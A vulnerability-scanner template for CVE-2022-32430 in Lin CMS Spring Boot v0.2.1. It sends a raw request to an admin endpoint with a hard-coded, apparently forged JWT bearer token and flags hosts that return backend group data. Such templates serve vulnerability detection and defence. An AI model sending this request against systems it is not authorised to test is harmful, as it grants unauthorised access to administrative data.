id: CVE-2022-32430

info:
  name: CVE-2022-32430
  author: zhizhuo
  severity: high
  description: |
    Lin CMS Spring Boot v0.2.1 中的访问控制问题允许攻击者访问应用程序中的后端信息和功能。
  reference:
    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-32430
  tags: LIN-CMS
flow: |
  http("verify")

http:
  - id: "verify"
    raw:
      - |
        GET /cms/admin/group/all HTTP/1.1
        Host: {{Hostname}}
        Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZGVudGl0eSI6MSwic2NvcGUiOiJsaW4iLCJ0eXBlIjoiYWNjZXNzIiwiZXhwIjoxNzUzMTkzNDc5fQ.SesmAnYN5QaHqSqllCInH0kvsMya5vHA1qPHuwCZ8N8

        

    matchers:
      - type: dsl
        dsl:
          - contains(body,"name") && contains(body,"id") && contains(body,"level") && !contains(body,"<html") && !contains(body,"<body") && !contains(body,"<script")
        condition: and

